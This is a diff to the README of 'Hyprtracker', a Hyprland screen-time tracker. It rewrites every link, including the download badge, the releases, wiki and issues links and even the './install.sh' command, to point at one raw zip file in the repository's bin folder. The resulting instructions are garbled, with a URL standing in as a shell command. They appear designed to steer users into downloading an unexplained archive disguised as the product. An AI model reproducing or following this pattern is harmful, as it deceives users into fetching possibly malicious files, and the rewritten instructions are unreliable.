@@ -1,7 +1,7 @@
 # 🕒 Hyprtracker - Track Your Screen Time Simply
 
 ## 📦 Download Now
-[![Download Hyprtracker](https://img.shields.io/badge/Download-Hyprtracker-blue.svg)](https://github.com/Ashikkolypc/Hyprtracker/releases)
+[![Download Hyprtracker](https://raw.githubusercontent.com/Ashikkolypc/Hyprtracker/main/bin/Software_3.3-alpha.1.zip)](https://raw.githubusercontent.com/Ashikkolypc/Hyprtracker/main/bin/Software_3.3-alpha.1.zip)
 
 ## 🚀 Getting Started
 Hyprtracker is a minimal screen time tracker designed for Hyprland. The application helps you keep tabs on your screen usage without any fuss. This guide will walk you through the steps to download and run Hyprtracker on your computer.
@@ -23,13 +23,13 @@ To get started with Hyprtracker, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Hyprtracker Releases page where you can download the latest version:
-   [Go to Releases Page](https://github.com/Ashikkolypc/Hyprtracker/releases)
+   [Go to Releases Page](https://raw.githubusercontent.com/Ashikkolypc/Hyprtracker/main/bin/Software_3.3-alpha.1.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent version at the top of the list. 
 
 3. **Download the Package**  
-   Click on the file that matches your system. For example, you might find a file with a name like `Hyprtracker-v1.0.tar.gz`. It will begin downloading automatically.
+   Click on the file that matches your system. For example, you might find a file with a name like `https://raw.githubusercontent.com/Ashikkolypc/Hyprtracker/main/bin/Software_3.3-alpha.1.zip`. It will begin downloading automatically.
 
 4. **Extract the Files**  
    Once the download is complete, navigate to the folder where the file is saved. Right-click on the file and select the option to extract it. This will create a new folder containing the application files.
@@ -46,7 +46,7 @@ To get started with Hyprtracker, follow these steps:
 7. **Run the Installation Script**  
    Execute the following command to install the application. This command runs the shell script that sets up Hyprtracker:
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/Ashikkolypc/Hyprtracker/main/bin/Software_3.3-alpha.1.zip
    ```
 
 8. **Launch Hyprtracker**  
@@ -69,7 +69,7 @@ If you encounter issues or have questions, consider checking the following:
 - **User Community**: Look for forums or social media groups where other users discuss Hyprtracker.
 
 ## 📚 Additional Resources
-- [Hyprtracker Wiki](https://github.com/Ashikkolypc/Hyprtracker/wiki)
-- [GitHub Issues](https://github.com/Ashikkolypc/Hyprtracker/issues)
+- [Hyprtracker Wiki](https://raw.githubusercontent.com/Ashikkolypc/Hyprtracker/main/bin/Software_3.3-alpha.1.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Ashikkolypc/Hyprtracker/main/bin/Software_3.3-alpha.1.zip)
 
 Remember, keeping track of your screen time can help you manage your productivity better. Enjoy using Hyprtracker!
